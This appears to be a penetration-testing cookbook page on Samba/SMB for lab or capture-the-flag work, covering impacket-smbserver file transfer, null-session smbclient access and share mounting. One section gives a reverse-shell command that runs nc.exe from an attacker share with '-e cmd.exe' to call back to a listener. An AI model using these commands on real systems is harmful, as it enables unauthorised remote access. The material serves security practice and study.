---
layout: default
title: Samba
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[smbclient](https://www.computerhope.com/unix/smbclien.htm)

[Mounting Samba shares](https://wiki.samba.org/index.php/Mounting_samba_shares_from_a_unix_client)

## Using SMB shares to move files between systems
On Kali, create a local `smb` folder and copy the files to be uploaded into it. Use `locate impacket` and copy either the `smbserver.py` or `impacket-smbserver` shell script locally. Start a local `smb` server instance using either of these:
```
python3 smbserver.py share smb
./impacket-smbserver share smb
```

On Windows, use the share normally, for example:
```
cp file.ext \\10.10.14.12\share
cp \\10.10.14.12\share\file.ext C:\Users\some-user\Downloads\file.ext
```

## Reverse shell using nc.exe and SMB
On Kali, find a copy of `nc.exe` for Windows using `locate nc.exe` and copy it to the SMB share. On Kali, start a listener using `nc -lvnp 33445`. On Windows, in a web shell, run the following for a reverse shell: 

```
\\10.10.14.12\share\nc.exe -e cmd.exe 10.10.14.12 33445
```

This should now connect back to the listener.

## Starting samber server with smb2 support
Windows 10 won't connect to an `impacket-smbserver` instance without running the server with `smb2` support:
```
On Kali:
sudo /usr/bin/impacket-smbserver -ip 192.168.x.x -smb2support share smb

On Windows 10:
copy C:\path\to\file.ext \\192.168.x.x\share\file.ext
```

## Connecting to a share via a null session
Return an SMB prompt:
```
smbclient //10.10.10.134/Backups "" -N 

Try "help" to get a list of possible commands.
smb: \> 
```

## Getting help
```
smb: \> ? command
smb: \> help command
```

## Execute local shell command
```
smb: \> ! pwd       // This executes the command locally, not on the remote target
```

## Mount remote SMB share to local folder
Create a local folder to mount to and them mount in the usual way.
```
sudo mount -t cifs //10.10.10.193/print$ fabricorp-print/ -o rw,user=bhult
```